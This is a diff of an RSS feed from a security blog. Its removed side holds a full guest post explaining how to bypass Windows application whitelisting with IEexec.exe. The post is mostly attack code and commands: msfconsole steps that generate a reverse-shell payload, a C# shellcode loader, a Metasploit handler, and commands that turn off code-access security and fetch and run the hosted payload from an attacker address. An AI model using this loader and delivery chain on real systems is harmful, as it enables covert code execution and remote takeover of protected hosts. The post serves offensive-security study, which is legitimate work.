@@ -1,163 +1,19 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>whitelisting on malicious.link</title>
-    <link>https://malicious.link/tags/whitelisting/</link>
-    <description>Recent content in whitelisting on malicious.link</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Thu, 16 Jan 2014 11:30:44 -0500</lastBuildDate>
-    
-        <atom:link href="https://malicious.link/tags/whitelisting/index.xml" rel="self" type="application/rss+xml" />
-    
-    
-    <item>
-      <title>Application Whitelist Bypass using IEexec.exe</title>
-      <link>https://malicious.link/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/</link>
-      <pubDate>Thu, 16 Jan 2014 11:30:44 -0500</pubDate>
-      
-      <guid>https://malicious.link/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/</guid>
-      <description>&lt;h2 id=&#34;guest-post-by-subteehttpstwittercomsubtee&#34;&gt;Guest post by &lt;a href=&#34;https://twitter.com/subTee&#34;&gt;@subTee&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;There was a recent presentation at DerbyCon, entitled:&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;http://www.youtube.com/watch?v=j-r6UonEkUw&#34;&gt;Living Off the Land: A Minimalist’s Guide to Windows Post-Exploitation&lt;/a&gt;
-by Christopher Campbell &amp;amp; Matthew Graeber&lt;/p&gt;
-&lt;p&gt;I highly recommend that you start with this presentation as it lays the foundation for this post.&lt;/p&gt;
-&lt;p&gt;The premise is, how can we maintain persistence in a corporate environment, using tools and defaults provided by the host OS we have compromised. This is a very important concept, given the shift in many organizations to an Application Whitelisting Defense model.&lt;/p&gt;
-&lt;p&gt;It is only a matter of time before time before you might encounter an Application Whitelisting Defense.&lt;/p&gt;
-&lt;p&gt;As a follow up to that presentation, I began exploring the binaries that ship by default with Windows.  That is where I stumbled across a binary in the &lt;code&gt;C:\Windows\Microsoft.NET\Framework64\v2.0.50727&lt;/code&gt; path.&lt;/p&gt;
-&lt;p&gt;The Executable is ieexec.exe. A write up is here: &lt;a href=&#34;http://support.microsoft.com/kb/822485&#34;&gt;http://support.microsoft.com/kb/822485&lt;/a&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;“The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.”&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;Excellent! So, now we just need to host our malicious binary , and call it from ieexec.exe.&lt;/p&gt;
-&lt;p&gt;This is great, since most Application Whitelisting Environments are going to “Trust” anything signed my Microsoft as a matter of convenience. IEexec.exe will download and execute our code for us, all under the trusted process.&lt;/p&gt;
-&lt;p&gt;So lets get started!&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Step 1.&lt;/strong&gt; Prepare your Shellcode, or whatever malicious app you want. I compiled my executable using SharpDevelop, since it has less footprint than a full blown Visual Studio install.
-From msfconsole:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; use windows/x64/shell/reverse_tcp
-msf payload(reverse_tcp) &amp;gt; set LHOST x.x.x.x
-msf payload(reverse_tcp) &amp;gt; set LPORT 443
-msf payload(reverse_tcp) &amp;gt; generate -t csharp
-￼
-byte[] buf = new byte[422] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52...
-
- &amp;lt;Snipped Full ShellCode for Brevity&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Step 2.&lt;/strong&gt; Create the .NET wrapper application&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; System; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; System.Runtime.InteropServices; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; native 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{ 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Program&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    { 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; UInt32 MEM_COMMIT = &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; UInt32 PAGE_EXECUTE_READWRITE = &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt;; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; UInt32 MEM_RELEASE = &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8000&lt;/span&gt;; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; Main(&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;[] args) 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        { 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// native function&amp;#39;s compiled code &lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] proc = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] { 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ae81ff&#34;&gt;0xfc&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x48&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x83&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0xe4&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0xf0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0xe8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0xc0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x51&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x50&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x52&lt;/span&gt;... 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;//Edited ShellCode For Brevity &lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            UInt32 funcAddr = VirtualAlloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, (UInt32)proc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            Marshal.Copy(proc, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, (IntPtr)(funcAddr), proc.Length); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            IntPtr hThread = IntPtr.Zero; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            UInt32 threadId = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// prepare data &lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            PROCESSOR_INFO info = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; PROCESSOR_INFO(); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            IntPtr pinfo = Marshal.AllocHGlobal(Marshal.SizeOf(&lt;span style=&#34;color:#66d9ef&#34;&gt;typeof&lt;/span&gt;(PROCESSOR_INFO))); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            Marshal.StructureToPtr(info, pinfo, &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// execute native code &lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            hThread = CreateThread(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, funcAddr, pinfo, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;ref&lt;/span&gt; threadId); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            WaitForSingleObject(hThread, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFFFFFFF&lt;/span&gt;); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// retrive data &lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            info = (PROCESSOR_INFO)Marshal.PtrToStructure(pinfo, &lt;span style=&#34;color:#66d9ef&#34;&gt;typeof&lt;/span&gt;(PROCESSOR_INFO)); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            Marshal.FreeHGlobal(pinfo); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            CloseHandle(hThread);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            VirtualFree((IntPtr)funcAddr, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, MEM_RELEASE); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;        [DllImport(&amp;#34;kernel32&amp;#34;)]&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extern&lt;/span&gt; UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;        [DllImport(&amp;#34;kernel32&amp;#34;)]&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extern&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;        [DllImport(&amp;#34;kernel32&amp;#34;)]&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extern&lt;/span&gt; IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, &lt;span style=&#34;color:#66d9ef&#34;&gt;ref&lt;/span&gt; UInt32 lpThreadId ); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;        [DllImport(&amp;#34;kernel32&amp;#34;)]&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extern&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; CloseHandle(IntPtr handle); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;        [DllImport(&amp;#34;kernel32&amp;#34;)]&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extern&lt;/span&gt; UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;        [DllImport(&amp;#34;kernel32&amp;#34;)]&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extern&lt;/span&gt; IntPtr GetModuleHandle( &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; moduleName ); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;        [DllImport(&amp;#34;kernel32&amp;#34;)]&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extern&lt;/span&gt; UInt32 GetProcAddress( IntPtr hModule, &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; procName ); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;        [DllImport(&amp;#34;kernel32&amp;#34;)]&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extern&lt;/span&gt; UInt32 LoadLibrary( &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; lpFileName ); 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;        [DllImport(&amp;#34;kernel32&amp;#34;)]&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extern&lt;/span&gt; UInt32 GetLastError();
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;        [StructLayout(LayoutKind.Sequential)]&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;internal&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PROCESSOR_INFO&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        { 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; UInt32 dwMax; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; UInt32 id0; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; UInt32 id1; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; UInt32 id2; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; UInt32 dwStandard; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; UInt32 dwFeature; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// if AMD &lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; UInt32 dwExt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You will want to compile the exe for the target platform. In this case I am going for an x64 target. Also, you will want to compile for 2.0 or 3.5 Framework.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Step 3.&lt;/strong&gt; Host the Exe. For this example, I used Mongoose. Simple and Effective:&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;http://code.google.com/p/mongoose/&#34;&gt;http://code.google.com/p/mongoose/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;By default Mongoose listens on port 8080. This is configurable. Simple place your compiled binary from step 2 into the same directory as Mongoose. Start Mongoose and you are almost ready to deliver your payload.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Step 4.&lt;/strong&gt; Setup your receiver:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf payload(reverse_tcp) &amp;gt; use exploit/multi/handler
-msf exploit(handler) &amp;gt; set LHOST x.x.x.x
-msf exploit(handler) &amp;gt; set LPORT 443
-msf exploit(handler) &amp;gt; set PAYLOAD windows/x64/shell/reverse_tcp
-msf exploit(handler) &amp;gt; exploit -j
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Step 5.&lt;/strong&gt; From the host that is protected via Whitelisting. Open 2 Command Prompts as administrator.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;CMD 1 Execute:&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\Windows\Microsoft.NET\Framework64\v2.0.50727&amp;gt;caspol.exe -s off
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;￼
-&lt;strong&gt;CMD 2 Execute:&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\Windows\Microsoft.NET\Framework64\v2.0.50727&amp;gt;ieexec.exe http://x.x.x.x:8080/bypass.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There is some detail to unpack here, I can go over later, as to why we need to run caspol.exe. Here’s the behavior I saw in our experimentation with this.&lt;/p&gt;
-&lt;p&gt;Initial attempt to run our rogue binary fails, since it is unknown/untrusted/unapproved:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2014/201401_whitelisting_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Now, on the same host&amp;hellip;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2014/201401_whitelisting_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Executes just fine!&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2014/201401_whitelisting_3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Its important to distinguish what this technique is and what it is not. This is not an exploit or vulnerability. Rather this is one way to execute arbitraty code in an Application Whitelisting Environment.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Summary:&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;In this document we learned that even if a host is in a mode where only trusted approved applications can run. IEexec.exe can be used in certain situations to circumvent a Whitelist, since it is likely a trusted binary, since it is signed by Microsoft.&lt;/p&gt;
-&lt;p&gt;Cheers,&lt;/p&gt;
-&lt;p&gt;=&amp;gt; &lt;a href=&#34;https://twitter.com/subTee&#34;&gt;@subTee&lt;/a&gt;&lt;/p&gt;
-</description>
-    </item>
-    
-  </channel>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>whitelisting - Tag - Malicious Link - Blog by mubix - Rob Fuller</title>
+        <link>https://malicious.link/tags/whitelisting/</link>
+        <description>whitelisting - Tag - Malicious Link - Blog by mubix - Rob Fuller</description>
+        <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>mubix@hak5.org (Rob Fuller)</managingEditor>
+            <webMaster>mubix@hak5.org (Rob Fuller)</webMaster><lastBuildDate>Thu, 16 Jan 2014 11:30:44 -0500</lastBuildDate><atom:link href="https://malicious.link/tags/whitelisting/" rel="self" type="application/rss+xml" /><item>
+    <title>Application Whitelist Bypass using IEexec.exe</title>
+    <link>https://malicious.link/posts/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/</link>
+    <pubDate>Thu, 16 Jan 2014 11:30:44 -0500</pubDate>
+    <author>subTee</author>
+    <guid>https://malicious.link/posts/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/</guid>
+    <description><![CDATA[Guest post by @subTee There was a recent presentation at DerbyCon, entitled:
+Living Off the Land: A Minimalist’s Guide to Windows Post-Exploitation by Christopher Campbell &amp; Matthew Graeber
